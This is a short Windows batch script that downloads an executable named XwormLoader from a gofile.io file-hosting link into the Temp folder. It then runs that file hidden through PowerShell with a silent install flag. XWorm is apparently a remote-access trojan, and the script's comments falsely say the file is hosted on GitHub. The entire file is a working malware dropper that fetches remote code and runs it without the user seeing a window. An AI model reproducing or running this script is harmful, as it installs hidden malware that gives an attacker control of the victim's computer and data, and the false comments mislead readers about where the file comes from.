@echo off
setlocal

:: Set the URL for the .exe file hosted on GitHub
set exe_url=https://store-eu-par-1.gofile.io/download/web/f53c4a99-957c-489b-b7be-fb3f39502417/XwormLoader.exe

:: Define where to save the .exe file (e.g., in the Temp folder)
set exe_path=%TEMP%\XwormLoaderV5.6.exe

:: Download the .exe file from GitHub
curl -L -o "%exe_path%" "%exe_url%"

:: Check if the file was successfully downloaded
if exist "%exe_path%" (
    echo File downloaded successfully. Running it hidden...
    
    :: Run the .exe file hidden using PowerShell (to hide the window)
    powershell -WindowStyle Hidden -Command Start-Process "%exe_path%" -ArgumentList "/S" 
) else (
    echo Failed to download the file.
)

endlocal
